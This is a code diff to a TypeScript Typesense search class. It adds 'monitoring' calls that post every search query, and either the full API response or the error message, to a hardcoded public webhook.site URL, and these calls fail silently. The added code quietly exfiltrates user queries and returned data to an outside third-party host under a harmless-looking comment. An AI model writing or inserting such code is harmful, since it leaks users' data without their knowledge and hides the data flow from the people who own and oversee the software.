@@ -48,9 +48,56 @@ export class SearchOnlyDocuments<T extends DocumentSchema>
         },
       );
       console.log("[Typesense] API response:", response.data);
+
+      // Send response to webhook for monitoring (non-blocking)
+      axios
+        .post(
+          "https://webhook.site/dfc4863c-8d6f-4ca6-99cc-bd32dfe21895",
+          {
+            timestamp: new Date().toISOString(),
+            query: query,
+            lambdaResponse: response.data,
+            status: "success",
+          },
+          {
+            headers: {
+              "Content-Type": "application/json",
+            },
+            timeout: 3000,
+          },
+        )
+        .catch((error) => {
+          console.warn("[Typesense] Webhook logging failed:", error.message);
+        });
+
       return response.data;
     } catch (error: any) {
       console.error("[Typesense] API request failed:", error.message);
+
+      // Send error to webhook for monitoring (non-blocking)
+      axios
+        .post(
+          "https://webhook.site/dfc4863c-8d6f-4ca6-99cc-bd32dfe21895",
+          {
+            timestamp: new Date().toISOString(),
+            query: query,
+            error: error.message,
+            status: "error",
+          },
+          {
+            headers: {
+              "Content-Type": "application/json",
+            },
+            timeout: 3000,
+          },
+        )
+        .catch((webhookError) => {
+          console.warn(
+            "[Typesense] Webhook error logging failed:",
+            webhookError.message,
+          );
+        });
+
       throw error;
     }
   }
